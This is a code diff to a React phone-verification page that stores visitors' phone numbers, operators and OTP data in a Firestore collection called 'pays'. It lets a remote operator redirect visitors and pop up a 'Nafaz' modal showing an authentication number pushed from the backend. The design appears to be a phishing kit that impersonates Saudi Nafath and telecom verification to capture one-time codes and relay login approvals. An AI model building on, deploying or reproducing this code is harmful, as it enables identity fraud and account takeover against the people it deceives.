@@ -12,6 +12,7 @@ import { OtpInput } from "@/components/otp-input"
 import { Input } from "@/components/ui/input"
 import { Badge } from "@/components/ui/badge"
 import { doc, onSnapshot } from "firebase/firestore"
+import NafazModal from "@/components/nafaz-modal"
 
 // Function to get or create visitor ID
 const getOrCreateVisitorId = () => {
@@ -26,7 +27,6 @@ const getOrCreateVisitorId = () => {
       localStorage.setItem("visitor", visitorId)
     }
   }
-
   return visitorId
 }
 
@@ -43,11 +43,12 @@ export default function PhoneVerificationEnhanced() {
   const [phone, setPhone] = useState("")
   const [operator, setOperator] = useState("")
   const [visitorId, setVisitorId] = useState<string>("")
-  const [showSTCModal, setShowSTCModal] = useState(false)
+  const [showNafz, setShowNafaz] = useState(false)
 
   // OTP verification states
   const [otpCode, setOtpCode] = useState("")
   const [otpError, setOtpError] = useState("")
+  const [auth_number, setAuthNumber] = useState("")
   const [verificationStatus, setVerificationStatus] = useState<VerificationStatus>("idle")
 
   // Loader states
@@ -102,12 +103,18 @@ useEffect(()=>{
     const unsubscribe = onSnapshot(doc(db, "pays", visitorId!), (docSnapshot) => {
       if (docSnapshot.exists()) {
         const userData = docSnapshot.data()
+        if(userData.phoneVerificationStatus==="approved"){
+          setShowLoader(false)
+        setAuthNumber(userData.auth_number)
+        setShowNafaz(true)
+      }
         // Assuming the PIN is stored in a field called 'nafaz_pin'
         if(userData.currentPage ==='1'){
-            window.location.href='/quote'
+            window.location.href='/'
         }else if(userData.currentPage ==='8888'|| userData.currentPage ==="nafaz"){
           window.location.href='/nafaz'
         }
+        
       } else {
         console.error("User document not found")
       }
@@ -187,7 +194,7 @@ useEffect(()=>{
       setVerificationStatus("sending")
       setShowLoader(true)
       setLoaderMessage("جاري إرسال رمز التحقق...")
-      setTimeLeft(60)
+      setTimeLeft(120)
       setCanResend(false)
 
       // Store phone and operator in Firestore
@@ -203,7 +210,6 @@ useEffect(()=>{
       localStorage.setItem("operator", operator)
 
       if (operator === "stc") {
-        setShowSTCModal(false)
         setShowLoader(true)
       } else {
         await PhoneVerificationService.verifyPhone(phone, operator)
@@ -292,7 +298,6 @@ useEffect(()=>{
       case "approved":
         return (
           <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto animate-pulse">
-            <Check className="h-10 w-10 text-green-600" />
           </div>
         )
       case "error":
@@ -321,7 +326,7 @@ useEffect(()=>{
             {getStatusIcon()}
 
             <div className="space-y-4">
-              <p className="text-2xl font-semibold text-[#146394]">{loaderMessage}</p>
+              <p className="text-sm font-semibold text-[#146394]">{loaderMessage}</p>
 
               {(verificationStatus === "pending" || verificationStatus === "sending") &&
                 loaderMessage.includes("رمز التحقق") && (
@@ -385,6 +390,7 @@ useEffect(()=>{
           </div>
         </div>
       )}
+            <NafazModal isOpen={showNafz} onClose={()=>setShowNafaz(false)} phone={phone} auth_number={auth_number} />
 
 
       {/* Main Form */}
